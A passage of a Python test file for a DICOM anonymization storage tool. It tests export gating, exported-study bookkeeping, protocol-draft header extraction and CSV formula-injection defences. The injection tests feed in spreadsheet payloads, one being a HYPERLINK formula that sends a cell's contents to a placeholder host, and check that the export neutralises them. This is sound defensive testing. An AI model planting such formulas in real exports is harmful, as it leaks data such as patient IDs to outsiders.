        assert sm._prepare_export_artifacts_sync(1) is False
        assert not (sm.export_path / "0001.json").exists()

    def test_blocked_when_not_rhythm_anonymized(self, tmp_path):
        # A CT slice that still carries device identity => a non-rhythm
        # profile => RHYTHM's GDPR-strict validator would reject it.
        sm = _manager(tmp_path)
        register_study(sm, 1, "ready")
        write_minimal_dicom(
            sm.base_path / "0001" / "0001" / "img.dcm",
            SOPClassUID=CTImageStorage, DeviceSerialNumber="79098",
            StationName="CTAWP1", Manufacturer="SIEMENS",
        )
        from pixieveil.storage.exam_sidecar import ExamSidecar
        ExamSidecar(1, dict(EXAM_OK)).save(sm.base_path)

        _item, blockers = sm._export_data_blockers_sync(1)
        assert any("rhythm' profile" in b for b in blockers)
        assert sm._prepare_export_artifacts_sync(1) is False

    def test_blocked_when_only_a_later_series_is_not_rhythm_anonymized(self, tmp_path):
        # Series 0001 clean, series 0002 still carries device identity:
        # every CT series must be checked, not just the first.
        sm = _manager(tmp_path)
        register_study(sm, 1, "ready")
        write_minimal_dicom(sm.base_path / "0001" / "0001" / "img.dcm",
                            SOPClassUID=CTImageStorage)
        write_minimal_dicom(sm.base_path / "0001" / "0002" / "img.dcm",
                            SOPClassUID=CTImageStorage, StationName="CTAWP1")
        from pixieveil.storage.exam_sidecar import ExamSidecar
        ExamSidecar(1, dict(EXAM_OK)).save(sm.base_path)

        _item, blockers = sm._export_data_blockers_sync(1)
        assert any("rhythm' profile" in b for b in blockers)

    def test_stale_artifacts_removed_when_study_stops_qualifying(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm)
        sm._prepare_export_artifacts_sync(1)
        assert (sm.export_path / "0001.zip").exists()

        # image quality gets cleared on a later edit
        from pixieveil.storage.exam_sidecar import ExamSidecar
        ExamSidecar(1, dict(EXAM_OK, image_quality=None)).save(sm.base_path)

        assert sm._prepare_export_artifacts_sync(1) is False
        assert not (sm.export_path / "0001.zip").exists()
        assert not (sm.export_path / "0001.json").exists()

    def test_rebuild_only_when_inputs_change(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm)
        sm._prepare_export_artifacts_sync(1)
        first_mtime = (sm.export_path / "0001.zip").stat().st_mtime

        # no change -> not rebuilt
        assert sm._export_artifacts_current_sync(1) is True
        sm._prepare_export_artifacts_sync(1)
        assert (sm.export_path / "0001.zip").stat().st_mtime == first_mtime

        # a newer .dcm -> rebuilt
        newer = time.time() + 10
        dcm = sm.base_path / "0001" / "0001" / "img1.dcm"
        os.utime(dcm, (newer, newer))
        assert sm._export_artifacts_current_sync(1) is False

    def test_prepare_ready_exports_covers_all_ready_studies(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm)                       # study 1: ready + clean
        register_study(sm, 2, "complete")     # not ready -> skipped

        asyncio.run(sm.prepare_ready_exports())

        assert (sm.export_path / "0001.zip").exists()
        assert not (sm.export_path / "0002.zip").exists()


class TestMarkExported:
    """Out-of-band export bookkeeping — partner tooling shipped the ZIP
    itself and calls mark_exported so PixieVeil archives + starts the
    retention clock."""

    def test_marks_ready_study_archived_and_stamps_exported_at(self, tmp_path):
        sm = _manager(tmp_path, retain_days=7)
        _ready_study(sm)
        sm._prepare_export_artifacts_sync(1)

        r = asyncio.run(sm.mark_exported(1))
        assert r == {"ok": True, "message": "marked exported (via rhythm)",
                     "status": "archived", "archived_via": "rhythm"}

        sc = sm.find_sidecar_by_number(1)
        assert sc.status == "archived" and sc.archived_via == "rhythm"
        assert sc.exported_at is not None and sc.purged_at is None
        assert (sm.base_path / "0001").exists()          # retention keeps it

    def test_no_retain_purges_immediately(self, tmp_path):
        sm = _manager(tmp_path)  # retain unset
        _ready_study(sm)
        sm._prepare_export_artifacts_sync(1)
        assert (sm.export_path / "0001.zip").exists()

        asyncio.run(sm.mark_exported(1, via="rhythm"))

        assert not (sm.base_path / "0001").exists()
        assert not (sm.export_path / "0001.zip").exists()
        sc = sm.find_sidecar_by_number(1)
        assert sc.exported_at is not None and sc.purged_at is not None

    def test_already_archived_is_noop_success(self, tmp_path):
        sm = _manager(tmp_path)
        register_study(sm, 1, "archived", archived_via="dicom")
        r = asyncio.run(sm.mark_exported(1))
        assert r["ok"] is True and r["message"] == "already archived"
        assert r["archived_via"] == "dicom"

    def test_refuses_non_ready(self, tmp_path):
        sm = _manager(tmp_path)
        register_study(sm, 1, "defacing_failed")
        r = asyncio.run(sm.mark_exported(1))
        assert r["ok"] is False and "not 'ready'" in r["message"]

    def test_unknown_study(self, tmp_path):
        sm = _manager(tmp_path)
        r = asyncio.run(sm.mark_exported(99))
        assert r == {"ok": False, "message": "study not found"}

    def test_invalid_via(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm)
        r = asyncio.run(sm.mark_exported(1, via="ftp"))
        assert r["ok"] is False and "invalid via" in r["message"]

    def test_sha_mismatch_is_warned_not_fatal(self, tmp_path):
        sm = _manager(tmp_path, retain_days=7)
        _ready_study(sm)
        sm._prepare_export_artifacts_sync(1)

        r = asyncio.run(sm.mark_exported(1, sha256="deadbeef"))
        assert r["ok"] is True
        assert "sha256 mismatch" in r["warning"]
        assert sm.find_sidecar_by_number(1).status == "archived"


class TestProtocolDraftInputs:
    """protocol_draft_inputs_sync's on-disk path: which image's headers feed
    "Draft protocol from study", and the pre-anonymization hint fallback."""

    def _sm(self, tmp_path):
        sm = _manager(tmp_path)
        register_study(sm, 1, "ready")
        from pixieveil.storage.exam_sidecar import ExamSidecar
        ExamSidecar(1, dict(EXAM_OK)).save(sm.base_path)
        return sm, sm.base_path / "0001"

    def test_no_exam_record_returns_none(self, tmp_path):
        sm = _manager(tmp_path)
        register_study(sm, 1, "ready")
        assert sm.protocol_draft_inputs_sync(1) is None

    def test_purged_study_gives_exam_and_no_headers(self, tmp_path):
        sm, study_dir = self._sm(tmp_path)
        exam, headers = sm.protocol_draft_inputs_sync(1)
        assert exam["image_quality"] == EXAM_OK["image_quality"]
        assert headers == {}

    def test_headers_come_from_first_diagnostic_ct_series(self, tmp_path):
        sm, d = self._sm(tmp_path)
        # 0001: topogram — skipped (LOCALIZER)
        write_minimal_dicom(d / "0001" / "a.dcm", SOPClassUID=CTImageStorage,
                            ImageType=["ORIGINAL", "PRIMARY", "LOCALIZER"], KVP="120")
        # 0002: Dose Report screen capture — skipped (not CT)
        write_minimal_dicom(d / "0002" / "a.dcm", SOPClassUID=SecondaryCaptureImageStorage,
                            KVP="999")
        # 0003: unreadable — skipped, not fatal
        (d / "0003").mkdir()
        (d / "0003" / "a.dcm").write_bytes(b"not dicom")
        # 0004: empty series folder — skipped
        (d / "0004").mkdir()
        # 0005_pre_deface: defacing backup — never read
        write_minimal_dicom(d / "0005_pre_deface" / "a.dcm", SOPClassUID=CTImageStorage,
                            KVP="70")
        # 0006: the diagnostic series — wins; only its *first* file is read
        write_minimal_dicom(d / "0006" / "a.dcm", SOPClassUID=CTImageStorage,
                            ImageType=["ORIGINAL", "PRIMARY", "AXIAL"],
                            KVP="100", ConvolutionKernel="Br40", SliceThickness="1.5",
                            ContrastBolusAgent="")
        write_minimal_dicom(d / "0006" / "b.dcm", SOPClassUID=CTImageStorage, KVP="140")
        # 0007: a later CT series — not reached (first one wins)
        write_minimal_dicom(d / "0007" / "a.dcm", SOPClassUID=CTImageStorage, KVP="80")

        _exam, headers = sm.protocol_draft_inputs_sync(1)

        assert headers["KVP"] == "100"
        assert headers["ConvolutionKernel"] == "Br40"
        assert headers["SliceThickness"] == "1.5"
        assert "ContrastBolusAgent" not in headers      # blank values dropped
        assert "SpiralPitchFactor" not in headers       # absent tags dropped

    @pytest.mark.filterwarnings("ignore:Invalid value for VR CS")
    def test_only_localizers_gives_no_technique_headers(self, tmp_path):
        sm, d = self._sm(tmp_path)
        write_minimal_dicom(d / "0001" / "a.dcm", SOPClassUID=CTImageStorage,
                            ImageType=["ORIGINAL", "PRIMARY", "localizer"], KVP="120")
        _exam, headers = sm.protocol_draft_inputs_sync(1)
        assert "KVP" not in headers                     # case-insensitive skip

    def test_pre_anonymization_hints_fill_scanner_and_protocol(self, tmp_path):
        # Under the rhythm profile these tags are stripped from the images;
        # the hints file (as StorageManager writes it) is the only source.
        sm, d = self._sm(tmp_path)
        d.mkdir(parents=True, exist_ok=True)
        sm._flush_exam_hints_sync(d, {
            "study": {"manufacturer": "SIEMENS", "model": "SOMATOM go.All",
                      "protocol_name": "Head Routine",
                      "study_description": "Head^HeadRoutine (Adult)"},
            "series": {},
        })
        write_minimal_dicom(d / "0001" / "a.dcm", SOPClassUID=CTImageStorage, KVP="120")

        _exam, headers = sm.protocol_draft_inputs_sync(1)

        assert headers["Manufacturer"] == "SIEMENS"
        assert headers["ManufacturerModelName"] == "SOMATOM go.All"
        assert headers["ProtocolName"] == "Head Routine"
        assert headers["StudyDescription"] == "Head^HeadRoutine (Adult)"
        assert headers["KVP"] == "120"

    def test_corrupt_hints_file_is_ignored(self, tmp_path):
        sm, d = self._sm(tmp_path)
        d.mkdir(parents=True, exist_ok=True)
        (d / ".exam_hints.json").write_text("{not json")
        write_minimal_dicom(d / "0001" / "a.dcm", SOPClassUID=CTImageStorage, KVP="120")
        _exam, headers = sm.protocol_draft_inputs_sync(1)
        assert headers == {"KVP": "120"}


class TestCorrespondenceCsvInjection:
    """PatientID / UIDs come from DICOM sent by any C-STORE peer (the SCP is
    unauthenticated); a value starting with = + - @ must not become a live
    formula when an admin opens the CSV export in a spreadsheet."""

    @pytest.mark.parametrize("evil", [
        '=HYPERLINK("http://x/?"&A2,"x")', "+1+1", "-2+3", "@SUM(A1)",
        "\t=1", "\r=1",
    ])
    def test_formula_like_values_are_neutralised(self, tmp_path, evil):
        import csv as _csv
        import io as _io
        from pixieveil.storage import correspondence

        sm = _manager(tmp_path)
        sc = register_study(sm, 1, "ready")
        sc.original_patient_id = evil
        sc.save(sm.base_path)

        text = correspondence.to_csv(correspondence.all_rows(sm.base_path))
        (row,) = list(_csv.DictReader(_io.StringIO(text)))
        cell = row["original_patient_id"]
        assert cell[0] not in "=+-@\t\r"
        assert cell == "'" + evil            # still readable, just inert

    def test_ordinary_values_unchanged(self, tmp_path):
        import csv as _csv
        import io as _io
        from pixieveil.storage import correspondence

        sm = _manager(tmp_path)
        sc = register_study(sm, 1, "ready")
        sc.original_patient_id = "PID-123"
        sc.save(sm.base_path)
        text = correspondence.to_csv(correspondence.all_rows(sm.base_path))
        (row,) = list(_csv.DictReader(_io.StringIO(text)))
        assert row["original_patient_id"] == "PID-123"
        assert row["study_number"] == "1"
